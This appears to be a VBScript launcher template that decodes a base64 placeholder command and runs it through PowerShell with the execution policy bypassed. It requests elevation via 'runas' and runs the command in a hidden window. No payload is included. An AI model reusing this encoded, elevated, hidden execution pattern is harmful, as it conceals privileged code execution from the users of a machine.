encodedCommand = "{{CHANNEL1_HEALER_CMD}}"

Function DecodeBase64(base64String)
    Dim xmlDoc, node, stream
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String

    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "Unicode"
    DecodeBase64 = stream.ReadText
    stream.Close
End Function

' Decode the command
cmd = DecodeBase64(encodedCommand)

' Get the current directory of the VBScript
Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
currentDir = fso.GetParentFolderName(WScript.ScriptFullName)

cmd = "Set-Location -Path '" & currentDir & "';" & cmd
cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " & cmd

Set objShell = CreateObject("WScript.Shell")

' Check for elevation
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

' Run the command
objShell.Run cmd, 0, True
